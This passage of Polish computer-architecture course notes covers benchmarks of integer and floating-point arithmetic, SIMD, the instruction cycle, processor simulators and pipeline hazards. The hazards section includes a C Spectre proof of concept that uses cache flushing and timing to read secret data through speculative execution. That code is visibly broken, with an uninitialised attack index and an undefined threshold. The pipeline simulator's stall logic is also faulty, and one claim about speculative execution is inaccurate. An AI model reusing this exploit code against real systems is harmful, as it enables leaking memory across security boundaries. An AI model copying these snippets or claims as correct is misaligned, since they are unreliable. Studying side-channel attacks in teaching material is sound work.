    size_t inner = matrix1[0].size();

    for (size_t i = 0; i < rows; ++i) {
        for (size_t j = 0; j < cols; ++j) {
            result[i][j] = 0;
            for (size_t k = 0; k < inner; ++k) {
                result[i][j] += matrix1[i][k] * matrix2[k][j];
            }
        }
    }
}

template <typename T>
void test_matrix_multiplication(int size, const string &type_name) {
    // Inicjalizacja macierzy
    vector<vector<T>> matrix1(size, vector<T>(size, static_cast<T>(2)));
    vector<vector<T>> matrix2(size, vector<T>(size, static_cast<T>(3)));
    vector<vector<T>> result(size, vector<T>(size, static_cast<T>(0)));

    // Mierzenie czasu mnożenia macierzy
    auto start_time = high_resolution_clock::now();
    multiply_matrices(matrix1, matrix2, result);
    auto end_time = high_resolution_clock::now();

    auto duration = duration_cast<milliseconds>(end_time - start_time).count();
    cout << "Czas wykonania mnożenia macierzy " << size << "x" << size << " dla typu " << type_name << ": " << duration << " milisekund" << endl;
}

int main() {
    // Przetestuj mnożenie macierzy dla różnych rozmiarów i typów danych
    test_matrix_multiplication<int>(100, "int");
    test_matrix_multiplication<float>(100, "float");
    test_matrix_multiplication<double>(100, "double");

    test_matrix_multiplication<int>(500, "int");
    test_matrix_multiplication<float>(500, "float");
    test_matrix_multiplication<double>(500, "double");

    test_matrix_multiplication<int>(1000, "int");
    test_matrix_multiplication<float>(1000, "float");
    test_matrix_multiplication<double>(1000, "double");

    cout << "Porównaj wyniki i omów znaczenie różnic w czasie wykonania dla różnych typów danych." << endl;

    return 0;
}
```

Program mnoży dwie macierze o ustalonych rozmiarach, używając typów stałoprzecinkowych (`int`) oraz zmiennoprzecinkowych (`float`, `double`). Następnie, mierzy czas wykonania mnożenia macierzy dla różnych rozmiarów macierzy (100x100, 500x500, 1000x1000) i porównuje wyniki dla różnych typów danych.

Po skompilowaniu i uruchomieniu programu, na konsoli zostaną wyświetlone wyniki czasu wykonania mnożenia macierzy dla różnych rozmiarów macierzy i typów danych. Porównaj wyniki i omów znaczenie różnic w czasie wykonania dla różnych typów danych.

Wyniki mogą się różnić w zależności od sprzętu i kompilatora. Analizuj różnice między typami danych (stałoprzecinkowe i zmiennoprzecinkowe) oraz rozmiarami macierzy. Zwróć uwagę na to, jak zmienia się czas wykonania w zależności od typu danych i rozmiaru macierzy. Zastanów się, jak te różnice wpływają na wydajność w praktycznych zastosowaniach, takich jak obliczenia naukowe, analiza danych czy grafika komputerowa.

W praktyce, wybór między typami danych zależy od wymagań dotyczących precyzji, wydajności i dostępnych zasobów. W przypadku obliczeń naukowych i analizy danych, precyzja może być kluczowa, ale jednocześnie może wpłynąć na czas wykonania. W grafice komputerowej, mniejsza precyzja może być akceptowalna, ale szybsze obliczenia mogą być kluczowe dla płynności działania aplikacji.


## Eksperyment z optymalizacją kodu.

1. Napisz prosty program, który wykonuje operacje matematyczne na liczbach stało- i zmiennoprzecinkowych.
2. Skompiluj i uruchom program z różnymi poziomami optymalizacji (np. -O0, -O1, -O2, -O3).
3. Porównaj czas wykonania programu dla różnych poziomów optymalizacji i zastanów się, jak optymalizacja wpływa na wydajność operacji stało- i zmiennoprzecinkowych.

## Wprowadzenie do instrukcji SIMD.

1. Zapoznaj się z instrukcjami SIMD (Single Instruction, Multiple Data) dostępnymi dla Twojego procesora (np. SSE, AVX).
2. Napisz program, który wykonuje operacje matematyczne na wektorach liczb stało- i zmiennoprzecinkowych, wykorzystując instrukcje SIMD.
3. Porównaj czas wykonania operacji wektorowych z użyciem SIMD do czasu wykonania operacji

Aby użyć instrukcji SIMD w C++, możemy wykorzystać bibliotekę `immintrin.h`, która obsługuje instrukcje SSE, SSE2, SSE3, SSSE3, SSE4.1, SSE4.2, AVX, AVX2 i AVX-512.

Poniżej znajduje się przykład programu w C++, który wykonuje operacje dodawania na wektorach liczb stało- i zmiennoprzecinkowych, wykorzystując instrukcje SIMD. Porównuje czas wykonania operacji wektorowych z użyciem SIMD do czasu wykonania operacji bez SIMD.

```cpp
#include <iostream>
#include <chrono>
#include <vector>
#include <immintrin.h>

using namespace std;
using namespace std::chrono;

const int vector_size = 1000000;

template <typename T>
void add_vectors(const vector<T> &a, const vector<T> &b, vector<T> &result) {
    for (size_t i = 0; i < a.size(); ++i) {
        result[i] = a[i] + b[i];
    }
}

void add_vectors_simd(const vector<float> &a, const vector<float> &b, vector<float> &result) {
    size_t simd_length = a.size() / 8;

    for (size_t i = 0; i < simd_length; ++i) {
        __m256 vec_a = _mm256_loadu_ps(&a[i * 8]);
        __m256 vec_b = _mm256_loadu_ps(&b[i * 8]);
        __m256 vec_result = _mm256_add_ps(vec_a, vec_b);
        _mm256_storeu_ps(&result[i * 8], vec_result);
    }
}

template <typename T>
void test_add_vectors(const string &type_name) {
    vector<T> a(vector_size, static_cast<T>(1));
    vector<T> b(vector_size, static_cast<T>(2));
    vector<T> result(vector_size, static_cast<T>(0));

    auto start_time = high_resolution_clock::now();
    add_vectors(a, b, result);
    auto end_time = high_resolution_clock::now();

    auto duration = duration_cast<milliseconds>(end_time - start_time).count();
    cout << "Czas wykonania dodawania wektorów bez SIMD dla " << type_name << ": " << duration << " ms" << endl;
}

void test_add_vectors_simd_float() {
    vector<float> a(vector_size, 1.0f);
    vector<float> b(vector_size, 2.0f);
    vector<float> result(vector_size, 0.0f);

    auto start_time = high_resolution_clock::now();
    add_vectors_simd(a, b, result);
    auto end_time = high_resolution_clock::now();

    auto duration = duration_cast<milliseconds>(end_time - start_time).count();
    cout << "Czas wykonania dodawania wektorów z użyciem SIMD dla float: " << duration << " ms" << endl;
}

int main() {
    test_add_vectors<int>("int");
    test_add_vectors<float>("float");
    test_add_vectors<double>("double");

    test_add_vectors_simd_float();

    return 0;
}
```

W tym przypadku, używamy instrukcji SIMD dla operacji dodawania wektorów zmiennoprzecinkowych (`float`). Program porównuje czas wykonania operacji wektorowych z użyciem SIMD do czasu wykonania operacji bez SIMD dla typów `int`, `float` i `double`. Po skompilowaniu i uruchomieniu programu, na konsoli zostaną wyświetlone wyniki czasu wykonania dodawania wektorów dla różnych typów danych, zarówno z użyciem SIMD, jak i bez.

Wyniki mogą się różnić w zależności od sprzętu i kompilatora, ale zazwyczaj SIMD przyspiesza obliczenia wektorowe, gdyż pozwala na wykonywanie operacji na wielu elementach danych jednocześnie.

W praktyce, wykorzystanie SIMD może prowadzić do znacznego przyspieszenia obliczeń wektorowych, szczególnie w zastosowaniach, takich jak grafika komputerowa, analiza danych czy przetwarzanie sygnałów. Jednak warto pamiętać, że nie wszystkie operacje mogą być przyspieszone przy użyciu SIMD, a także, że optymalizacja przy użyciu SIMD może zwiększyć złożoność kodu i utrudnić jego utrzymanie.


> Ref:
> - [Native code performance on modern CPUs](https://www.cppstories.com/2014/04/presentation-native-code-performance-on-modern-cpus/)



# Analiza cyklu rozkazowego:

## Zdefiniowanie cyklu rozkazowego i jego faz (pobieranie, dekodowanie, wykonanie, dostęp do pamięci i zapis wyniku).

Cykl rozkazowy to sekwencja kroków, które wykonuje procesor w celu pobrania, zdekodowania i wykonania pojedynczego rozkazu. Cykl rozkazowy składa się z pięciu głównych faz, które są realizowane sekwencyjnie:

1. Pobieranie (Fetch): W tej fazie procesor pobiera rozkaz z pamięci. Wartość licznika rozkazów (Program Counter, PC) wskazuje na adres pamięci, z którego rozkaz ma być pobrany. Po pobraniu rozkazu, licznik rozkazów jest zwiększany o rozmiar rozkazu, aby wskazać na kolejny rozkaz.

2. Dekodowanie (Decode): Pobrany rozkaz jest dekodowany przez jednostkę dekodującą procesora, która interpretuje go i ustala, jakie operacje należy wykonać oraz które rejestry i/lub wartości są używane jako argumenty.

3. Wykonanie (Execute): W tej fazie jednostka wykonawcza procesora przeprowadza operacje zdefiniowane przez rozkaz. Może to obejmować działania arytmetyczne, logiczne, przesunięcia bitowe lub inne operacje. Wynik tych operacji jest przechowywany w rejestrze tymczasowym.

4. Dostęp do pamięci (Memory Access): Jeśli rozkaz wymaga dostępu do pamięci, na przykład w celu odczytania lub zapisania wartości, w tej fazie procesor odczytuje dane z pamięci lub zapisuje je w odpowiednim miejscu.

5. Zapis wyniku (Write-back): W tej ostatniej fazie wynik operacji, przechowywany w rejestrze tymczasowym, jest zapisywany do odpowiedniego rejestru procesora lub do pamięci, jeśli jest to wymagane.

Przykład analizy cyklu rozkazowego:

Rozważmy prosty przykład dodawania dwóch liczb, przechowywanych w rejestrach R1 i R2, a wynik ma być zapisany w rejestrze R3. Rozkaz może wyglądać tak: ADD R3, R1, R2

1. Pobieranie: Procesor pobiera rozkaz ADD z adresu wskazanego przez licznik rozkazów (PC) i zwiększa wartość PC.
2. Dekodowanie: Jednostka dekodująca interpretuje rozkaz jako operację dodawania, gdzie R1 i R2 są argumentami, a wynik ma być zapisany w R3.
3. Wykonanie: Jednostka wykonawcza dodaje wartości z rejestru R1 i R2, a wynik przechowuje w rejestrze tymczasowym.
4. Dostęp do pamięci: W tym przypadku nie ma potrzeby dostępu do pamięci, ponieważ wszystkie wartości są przechowywane w rejestrach.
5. Zapis wyniku: Wynik dodawania, przechowywany w rejestrze tymczasow


## Zaproponuj zestaw rozkazów, jakie są poszczególne etapy cyklu rozkazowego dla każdego z nich.

Przyjmijmy prosty zestaw rozkazów oparty na hipotetycznym procesorze z ograniczoną architekturą. Rozkazy:

1. LOAD R1, (ADDR) - Ładuje wartość z pamięci o adresie ADDR do rejestru R1.
2. STORE R1, (ADDR) - Zapisuje wartość z rejestru R1 do pamięci o adresie ADDR.
3. ADD R1, R2 - Dodaje wartości z rejestru R1 i R2, a wynik zapisuje w rejestrze R1.
4. SUB R1, R2 - Odejmuje wartość rejestru R2 od wartości rejestru R1, a wynik zapisuje w rejestrze R1.
5. JUMP ADDR - Bezwarunkowy skok do adresu ADDR.
6. JZERO R1, ADDR - Skok warunkowy do adresu ADDR, jeśli wartość w rejestrze R1 wynosi 0.

Omówienie poszczególnych etapów cyklu rozkazowego dla każdego z rozkazów:

1. LOAD R1, (ADDR):
    
    - Pobieranie: Procesor pobiera rozkaz LOAD z pamięci.
    - Dekodowanie: Dekodowanie rozkazu LOAD i identyfikacja rejestru R1 oraz adresu pamięci ADDR.
    - Wykonanie: Brak operacji wykonawczych dla tego rozkazu.
    - Dostęp do pamięci: Odczyt wartości z pamięci o adresie ADDR.
    - Zapis wyniku: Zapisanie odczytanej wartości do rejestru R1.
2. STORE R1, (ADDR):
    
    - Pobieranie: Procesor pobiera rozkaz STORE z pamięci.
    - Dekodowanie: Dekodowanie rozkazu STORE i identyfikacja rejestru R1 oraz adresu pamięci ADDR.
    - Wykonanie: Brak operacji wykonawczych dla tego rozkazu.
    - Dostęp do pamięci: Zapis wartości z rejestru R1 do pamięci o adresie ADDR.
    - Zapis wyniku: Brak operacji zapisu wyniku, ponieważ wynik został już zapisany w pamięci.
3. ADD R1, R2:
    
    - Pobieranie: Procesor pobiera rozkaz ADD z pamięci.
    - Dekodowanie: Dekodowanie rozkazu ADD i identyfikacja rejestrów R1 i R2.
    - Wykonanie: Dodawanie wartości z rejestru R1 i R2, a wynik przechowuje w rejestrze tymczasowym.
    - Dostęp do pamięci: Brak dostępu do pamięci, ponieważ wszystkie wartości są przechowywane w rejestrach.
    - Zapis wyniku: Zapisanie wyniku dodawania do rejestru R1.
4. SUB R1, R2:
    
    - Pobieranie: Procesor pobiera rozkaz SUB z pamięci.
    - Dekodowanie: Dekodowanie rozkazu SUB i identyfikacja rejestrów R1 i R2.
    - Wykonanie: Odejmowanie wartości rejestru R2 od wartości rejestru R1, a wynik przechowuje w rejestrze tymczasowym.
	- Dostęp do pamięci: Brak dostępu do pamięci, ponieważ wszystkie wartości są przechowywane w rejestrach.
	- Zapis wyniku: Zapisanie wyniku odejmowania do rejestru R1.

5. JUMP ADDR:
    
    - Pobieranie: Procesor pobiera rozkaz JUMP z pamięci.
    - Dekodowanie: Dekodowanie rozkazu JUMP i identyfikacja adresu ADDR.
    - Wykonanie: Aktualizacja licznika rozkazów (PC) na wartość ADDR.
    - Dostęp do pamięci: Brak dostępu do pamięci.
    - Zapis wyniku: Brak operacji zapisu wyniku, ponieważ wynik został już zaktualizowany w liczniku rozkazów (PC).
6. JZERO R1, ADDR:
    
    - Pobieranie: Procesor pobiera rozkaz JZERO z pamięci.
    - Dekodowanie: Dekodowanie rozkazu JZERO i identyfikacja rejestru R1 oraz adresu ADDR.
    - Wykonanie: Sprawdzenie, czy wartość w rejestrze R1 wynosi 0.
    - Dostęp do pamięci: Brak dostępu do pamięci.
    - Zapis wyniku: Jeśli wartość w rejestrze R1 wynosi 0, aktualizacja licznika rozkazów (PC) na wartość ADDR. W przeciwnym razie PC zostaje zwiększone do kolejnego rozkazu.

Dla każdego z tych rozkazów analiza cyklu rozkazowego obejmuje omówienie poszczególnych faz (pobieranie, dekodowanie, wykonanie, dostęp do pamięci i zapis wyniku) oraz zrozumienie, jak procesor wykonuje te rozkazy sekwencyjnie. W przypadku procesorów z potokiem rozkazowym, kolejne rozkazy mogą być przetwarzane równocześnie w różnych fazach, zwiększając przepustowość procesora i efektywnie przyspieszając wykonywanie programu.

## Prosty symulator cyklu rozkazowego dla prostego procesora

## Python:

``` python
class SimpleProcessor:
    def __init__(self, memory, instructions):
        self.memory = memory
        self.instructions = instructions
        self.registers = [0, 0, 0]
        self.PC = 0

    def fetch(self):
        instruction = self.instructions[self.PC]
        self.PC += 1
        return instruction

    def decode(self, instruction):
        opcode, operands = instruction[0], instruction[1:]
        return opcode, operands

    def execute(self, opcode, operands):
        if opcode == "LOAD":
            self.registers[operands[0]] = self.memory[operands[1]]
        elif opcode == "STORE":
            self.memory[operands[1]] = self.registers[operands[0]]
        elif opcode == "ADD":
            self.registers[operands[0]] += self.registers[operands[1]]
        elif opcode == "SUB":
            self.registers[operands[0]] -= self.registers[operands[1]]
        else:
            raise ValueError(f"Nieznany rozkaz: {opcode}")

    def run(self):
        while self.PC < len(self.instructions):
            instruction = self.fetch()
            opcode, operands = self.decode(instruction)
            self.execute(opcode, operands)

# Przykład użycia symulatora
memory = [10, 20, 30, 40, 50]
instructions = [
    ("LOAD", 0, 0),
    ("LOAD", 1, 1),
    ("ADD", 0, 1),
    ("STORE", 0, 2)
]

processor = SimpleProcessor(memory, instructions)
processor.run()

print("Rejestry:", processor.registers)
print("Pamięć:", processor.memory)
```

## C++

``` C++
#include <iostream>
#include <string>
#include <vector>

class SimpleProcessor {
public:
    SimpleProcessor(const std::vector<int>& memory, const std::vector<std::vector<std::string>>& instructions)
        : memory(memory), instructions(instructions), registers(3, 0), PC(0) {}

    void run() {
        while (PC < instructions.size()) {
            auto instruction = fetch();
            auto [opcode, operands] = decode(instruction);
            execute(opcode, operands);
        }
    }

    void printState() {
        std::cout << "Rejestry: ";
        for (const auto& reg : registers) {
            std::cout << reg << " ";
        }
        std::cout << std::endl;

        std::cout << "Pamięć: ";
        for (const auto& mem : memory) {
            std::cout << mem << " ";
        }
        std::cout << std::endl;
    }

private:
    std::vector<std::string> fetch() {
        auto instruction = instructions[PC];
        PC++;
        return instruction;
    }

    std::pair<std::string, std::vector<int>> decode(const std::vector<std::string>& instruction) {
        std::string opcode = instruction[0];
        std::vector<int> operands;
        for (size_t i = 1; i < instruction.size(); ++i) {
            operands.push_back(std::stoi(instruction[i]));
        }
        return {opcode, operands};
    }

    void execute(const std::string& opcode, const std::vector<int>& operands) {
        if (opcode == "LOAD") {
            registers[operands[0]] = memory[operands[1]];
        } else if (opcode == "STORE") {
            memory[operands[1]] = registers[operands[0]];
        } else if (opcode == "ADD") {
            registers[operands[0]] += registers[operands[1]];
        } else if (opcode == "SUB") {
            registers[operands[0]] -= registers[operands[1]];
        } else {
            std::cerr << "Nieznany rozkaz: " << opcode << std::endl;
            exit(1);
        }
    }

    std::vector<int> memory;
    std::vector<std::vector<std::string>> instructions;
    std::vector<int> registers;
    size_t PC;
};

int main() {
    std::vector<int> memory = {10, 20, 30, 40, 50};
    std::vector<std::vector<std::string>> instructions = {
        {"LOAD", "0", "0"},
        {"LOAD", "1", "1"},
        {"ADD", "0", "1"},
        {"STORE", "0", "2"}
    };

    SimpleProcessor processor(memory, instructions);
    processor.run();

    processor.printState();
    return 0;
}
```


# Analiza potoku rozkazowego:

## Potok rozkazowego i jego cele (zwiększenie przepustowości, równoległe wykonanie rozkazów).

Potok rozkazowy (ang. instruction pipeline) to technika wykorzystywana w mikroarchitekturze procesorów, mająca na celu zwiększenie przepustowości i wydajności przez równoczesne wykonywanie kilku rozkazów w różnych etapach ich przetwarzania. Potok rozkazowy dzieli cykl rozkazowy na kilka etapów, z których każdy może być przetwarzany równocześnie przez różne jednostki wykonawcze procesora. Dzięki temu, zamiast czekać na zakończenie jednego rozkazu, procesor może przetwarzać kolejne rozkazy, zwiększając przepustowość i efektywnie przyspieszając wykonywanie programu.

### Cele potoku rozkazowego:

1. Zwiększenie przepustowości: Potok rozkazowy pozwala na równoczesne przetwarzanie kilku rozkazów w różnych etapach cyklu rozkazowego, co zwiększa przepustowość procesora i pozwala na szybsze wykonanie programu.

2. Równoległe wykonanie rozkazów: Potok rozkazowy pozwala na równoczesne wykonywanie różnych operacji w różnych jednostkach wykonawczych procesora, co oznacza, że procesor może jednocześnie wykonywać operacje na różnych danych, zwiększając wydajność obliczeń.

### Przykład potoku rozkazowego

Załóżmy, że mamy prosty procesor z czterema etapami cyklu rozkazowego: pobieranie (IF - Instruction Fetch), dekodowanie (ID - Instruction Decode), wykonanie (EX - Execute) i zapis wyniku (WB - Write Back). Potok rozkazowy dla tego procesora będzie miał cztery etapy, które można wykonać równocześnie dla różnych rozkazów.

``` as
  Rozkaz 1: IF -> ID -> EX -> WB
  Rozkaz 2:      -> IF -> ID -> EX -> WB
  Rozkaz 3:           -> IF -> ID -> EX -> WB
  Rozkaz 4:                -> IF -> ID -> EX -> WB
```

Jak widać na powyższym przykładzie, potok rozkazowy pozwala na równoczesne przetwarzanie kilku rozkazów w różnych etapach cyklu rozkazowego. W momencie, gdy pierwszy rozkaz jest w fazie wykonania (EX), drugi rozkaz jest w fazie dekodowania (ID), a trzeci rozkaz jest pobierany (IF). Dzięki temu procesor może jednocześnie pracować nad różnymi rozkazami, zwiększając swoją przepustowość i wydajność.

Jednakże, potok rozkazowy wprowadza również pewne wyzwania, takie jak zarządzanie hazardami (ang. hazards). Hazardy to sytuacje, w których wynik jednego rozkazu jest potrzebny przez następny rozkaz, a potok rozkazowy musi zarządzać tymi zależnościami, aby uniknąć konflikty lub zależności. 

Istnieją trzy główne rodzaje hazardów:

1. Hazardy strukturalne: Występują, gdy różne rozkazy próbują jednocześnie korzystać z tego samego zasobu procesora, takiego jak jednostka wykonawcza, pamięć czy rejestry. Hazardy strukturalne mogą prowadzić do opóźnień lub konieczności oczekiwania przez niektóre rozkazy na dostęp do zasobów.

   Sposoby minimalizowania hazardów strukturalnych:
   1. Wprowadzenie dodatkowych zasobów: Zwiększenie liczby jednostek wykonawczych, pamięci czy rejestrów może zmniejszyć ryzyko wystąpienia konfliktów.
   2. Replikacja zasobów: Duplicowanie zasobów pozwala na równoczesne korzystanie z nich przez różne rozkazy.
   3. Wykorzystanie buforów i kolejkowania: Buforowanie i kolejkowanie operacji może pomóc w zarządzaniu dostępem do zasobów i zmniejszyć opóźnienia.

2. Hazardy danych: Występują, gdy jeden rozkaz jest zależny od wyniku innego rozkazu, który jeszcze nie został zakończony. Hazardy danych mogą prowadzić do nieprawidłowych wyników, jeśli nie zostaną odpowiednio obsłużone.

   Sposoby minimalizowania hazardów danych:
   1. Przesunięcie potoku (stalling): Wstrzymywanie wykonywania zależnego rozkazu aż do momentu, gdy wynik potrzebny dla tego rozkazu będzie dostępny.
   2. Przekształcanie potoku (forwarding): Przekazanie wyniku zależnego rozkazu bezpośrednio do kolejnego rozkazu, bez konieczności zapisywania wyniku w rejestrze.
   3. Przeplanowanie rozkazów: Kompilator lub procesor może próbować zmienić kolejność rozkazów, aby zmniejszyć zależności i poprawić wydajność potoku rozkazowego.


3. Hazardy kontroli: Występują, gdy kolejność wykonywania rozkazów ulega zmianie z powodu instrukcji warunkowych, takich jak skoki czy instrukcje warunkowe. Hazardy kontroli mogą prowadzić do niepotrzebnego wypełnienia potoku rozkazów i straty wydajności.

> Ref:
> - [Branch prediction examples](https://www.youtube.com/watch?v=aujUQ274bEE)

   Sposoby minimalizowania hazardów kontroli:
   1. Przewidywanie rozgałęzień (branch prediction): Procesor próbuje przewidywać, czy dane rozgałęzienie zostanie wykonane, i wstępnie ładuje odpowiednie rozkazy do potoku rozkazowego.
   2. Opóźnianie rozgałęzienia (branch delay slot): Procesor pozwala na wykonanie jednego lub kilku rozkazów po instrukcji rozgałęzienia, zanim rzeczywista zmiana przepływu sterowania zostanie wprowadzona. Kompilator może umieścić niezależne rozkazy w tych opóźnionych miejscach, aby zmniejszyć straty wydajności spowodowane hazardami kontroli.
   3. Wykonanie spekulatywne (speculative execution): Procesor wykonuje obie ścieżki po rozgałęzieniu warunkowym, jednocześnie śledząc poprawność wyników. Gdy warunek rozgałęzienia zostanie ostatecznie wyznaczony, procesor odrzuca wyniki niewłaściwej ścieżki i kontynuuje wykonanie poprawnej ścieżki.

   Interesująca podatność związana z SE (side-channel) - [Spectre](https://en.wikipedia.org/wiki/Spectre_(security_vulnerability))

Podatność Spectre dotyczy złośliwego wykorzystania spekulatywnego wykonania instrukcji przez procesor w celu uzyskania dostępu do poufnych informacji.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>

#define CACHE_LINE_SIZE 64
#define CACHE_SIZE 256

uint8_t timing_array[CACHE_SIZE * CACHE_LINE_SIZE];
uint8_t temp = 0;

// Funkcja do wyczyszczenia zawartości cache
void flush_cache() {
    for (size_t i = 0; i < CACHE_SIZE; i++) {
        _mm_clflush(&timing_array[i * CACHE_LINE_SIZE]);
    }
}

// Funkcja mierząca czas dostępu do danego elementu w timing_array
uint64_t measure_access_time(void *address) {
    uint64_t time1, time2;

    uint32_t trash;
    _asm {
        lfence
        rdtsc
        mov time1, eax
        mov eax, [address]
        mov trash, eax
        rdtsc
        mov time2, eax
        lfence
    }

    return time2 - time1;
}

// Funkcja wykorzystująca spekulatywne wykonanie instrukcji
void malicious_code(size_t x, const uint8_t *data, size_t data_length) {
    if (x < data_length) {
        temp &= timing_array[data[x] * CACHE_LINE_SIZE];
    }
}

void spectre_attack(const uint8_t *data, size_t data_length, uint8_t *output) {
    size_t training_x = 0;
    size_t malicious_x;

    for (size_t i = 0; i < 256; i++) {
        flush_cache();

        // Pętla treningowa
        for (int j = 0; j < 30; j++) {
            _mm_lfence();
            malicious_code(training_x % data_length, data, data_length);
        }

        // Atak
        _mm_lfence();
        malicious_code(malicious_x, data, data_length);

        // Analiza czasów dostępu do timing_array
        for (size_t i = 0; i < CACHE_SIZE; i++) {
            uint64_t time = measure_access_time(&timing_array[i * CACHE_LINE_SIZE]);

            if (time < threshold) {
                output[i]++;
            }
        }
    }
}

int main() {
    uint8_t secret_data[] = "Spectre - Secret Data";
    size_t data_length = sizeof(secret_data);
    uint8_t output[256] = {0};

    srand(time(NULL));
    size_t malicious_x = (size_t)(secret_data - (char *)timing_array + (rand() % 256));

    spectre_attack(secret_data, data_length, output);

    for (size_t i = 0; i < 256; i++) {
        if (output[i]) {
            printf("Recovered byte at index %zu: 0x%02x ('%c')\n", i, i, (char)i);
        }
    }

    return 0;
}
```

W powyższym przykładzie, funkcja `malicious_code` jest używana do wywołania spekulatywnego wykonania instrukcji. Funkcja `spectre_attack` zawiera pętlę treningową, która zmusza procesor do spekulatywnego wykonania instrukcji dla wartości `x` znajdującej się w granicach tablicy `data`. Następnie atak polega na przekazaniu wartości `malicious_x`, która wskazuje na tajne dane. W rezultacie procesor próbuje spekulatywnie wykonać instrukcje z funkcji `malicious_code` dla tych danych.

W międzyczasie, funkcje `flush_cache` i `measure_access_time` są używane do analizy czasów dostępu do tablicy `timing_array`. Jeśli dostęp do danego elementu tablicy `timing_array` jest szybki, oznacza to, że był on wcześniej wczytany do pamięci podręcznej przez spekulatywne wykonanie instrukcji. W ten sposób, możliwe jest odtworzenie wartości tajnych danych.

W funkcji `main`, tworzymy tablicę `secret_data` z tajnymi danymi i tablicę `output` do przechowywania wyników ataku. Następnie wywołujemy funkcję `spectre_attack`, która przeprowadza atak i zapisuje wyniki do tablicy `output`. Na koniec, program wypisuje odtworzone tajne dane na podstawie wyników zapisanych w tablicy `output`.

Należy pamiętać, że powyższy przykład jest uproszczony i może nie działać na wszystkich konfiguracjach sprzętowych. Ponadto, współczesne systemy operacyjne i procesory stosują różne techniki łagodzenia podatności Spectre, które mogą wpłynąć na skuteczność tego ataku.

Dodatkowo:

**Przetwarzanie wielowątkowe (multithreading)**: Procesor może przełączać się między różnymi wątkami wykonawczymi, gdy napotyka hazardy kontroli. Pozwala to na utrzymanie potoku rozkazowego aktywnym i wydajnym, nawet gdy jeden wątek oczekuje na wynik rozgałęzienia.

W praktyce zaawansowane mikroarchitektury procesorów stosują różne techniki, aby zarządzać hazardami potoku rozkazowego i zwiększać wydajność procesora. Optymalizacja wykorzystania potoku rozkazowego, zarządzanie hazardami oraz przyspieszenie wykonywania programów są kluczowe dla osiągnięcia wysokiej wydajności w nowoczesnych procesorach.


## Przykładowe sposoby minimalizacji hazardów


1. Hazard strukturalny:
Załóżmy, że mamy procesor z jednym modułem ALU (Arithmetic Logic Unit) i poniższymi rozkazami do wykonania:

```
Rozkaz 1: ADD R1, R2, R3
Rozkaz 2: MUL R4, R5, R6
Rozkaz 3: SUB R7, R8, R9
```

Wszystkie trzy rozkazy wymagają dostępu do ALU. W celu zapobieżenia hazardom strukturalnym, procesor może:
   1. Wprowadzić dodatkowe moduły ALU, aby umożliwić równoczesne wykonywanie różnych operacji.
   2. Zastosować buforowanie i kolejkowanie operacji, aby zarządzać dostępem do ALU i zmniejszyć opóźnienia.

2. Hazard danych:
Załóżmy, że mamy następujący ciąg rozkazów:

```
Rozkaz 1: ADD R1, R2, R3
Rozkaz 2: SUB R4, R1, R5
Rozkaz 3: MUL R6, R4, R7
```

Wynik rozkazu 1 (ADD) jest używany jako wejście dla rozkazu 2 (SUB), a wynik rozkazu 2 jest używany jako wejście dla rozkazu 3 (MUL). W celu zarządzania hazardami danych, procesor może:
   1. Wstrzymać wykonywanie rozkazu 2 (stalling), aż do momentu, gdy wynik rozkazu 1 będzie dostępny.
   2. Zastosować przekształcanie potoku (forwarding), przekazując wynik rozkazu 1 bezpośrednio do rozkazu 2, bez konieczności zapisywania wyniku w rejestrze.

3. Hazard kontroli:
Załóżmy, że mamy następujący ciąg rozkazów z instrukcją warunkowego skoku:

``` as
Rozkaz_1: CMP R1, R2
Rozkaz_2: JNE label
Rozkaz_3: ADD R3, R4, R5
label:    MUL R6, R7, R8
```

W przypadku hazardu kontroli spowodowanego przez instrukcję warunkowego skoku (JNE), procesor może:
   1. Zastosować przewidywanie rozgałęzień (branch prediction), próbując przewidzieć, czy skok zostanie wykonany, i wstępnie ładując odpowiednie rozkazy do potoku rozkazowego.
   2. Wykorzystać opóźnienie rozgałęzienia (branch delay slot), umieszczając jeden lub więcej niezależnych rozkazów po instrukcji skoku, które zostaną wykonane przed rzeczywistym skokiem


W praktyce, zaawansowane mikroarchitektury procesorów stosują różne techniki, aby zarządzać hazardami potoku rozkazowego i zwiększać wydajność procesora, takie jak przewidywanie rozgałęzień, optymalizacja wykonywania potoku czy wykorzystanie wielowątkowości.

## Zadanie z symulacją: symulator potoku rozkazowego dla prostego procesora, uwzględniając hazardy.

### Pierwszy

Zakładając, że mamy prosty procesor z potokiem rozkazowego o 5 etapach (IF - pobieranie rozkazu, ID - dekodowanie, EX - wykonanie, MEM - dostęp do pamięci, WB - zapis wyniku), przedstawiam prosty symulator potoku rozkazowego uwzględniający hazardy danych.

``` C++	
#include <iostream>
#include <vector>
#include <string>
#include <map>

// Struktura rozkazu
struct Instruction {
    std::string op;
    std::string rd, rs, rt;
};

// Przykład programu z potencjalnym hazardem danych
std::vector<Instruction> program = {
    {"ADD", "R1", "R2", "R3"},
    {"SUB", "R4", "R1", "R5"},
    {"MUL", "R6", "R4", "R7"},
};

// Rejestry procesora i ich początkowa wartosc
std::map<std::string, int> registers = {
    {"R1", 0},
    {"R2", 1},
    {"R3", 2},
    {"R4", 0},
    {"R5", 3},
    {"R6", 0},
    {"R7", 4},
};

// Symulacja potoku rozkazowego z obsługą hazardów danych
void simulatePipeline() {
    int pc = 0;
    int cycles = 0;
    int num_instructions = program.size();

    while (pc < num_instructions) {
        // Symulacja potoku rozkazowego
        for (int i = 0; i < 5; ++i) {
            // Jeśli etap jest wykonywany dla ważnego rozkazu
            if (pc - i >= 0 && pc - i < num_instructions) {
                Instruction inst = program[pc - i];

                switch (i) {
                    case 0: // IF - pobieranie rozkazu
                        std::cout << "IF: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
                        break;
                    case 1: // ID - dekodowanie
                        std::cout << "ID: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
                        // Wstrzymujemy potok, jeśli występuje hazard danych
                        if (i < num_instructions - 1 && (inst.rd == program[pc - i + 1].rs || inst.rd == program[pc - i + 1].rt)) {
                            std::cout << "Stalling due to data hazard" << std::endl;
                            --pc;
                            break;
                        }
                        break;
                    case 2: // EX - wykonanie
                        std::cout << "EX: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
                        break;
                    case 3: // MEM - dostęp do pamięci
                        std::cout << "MEM: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
                        break;
                    case 4: // WB - zapis wyniku
                        std::cout << "WB: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
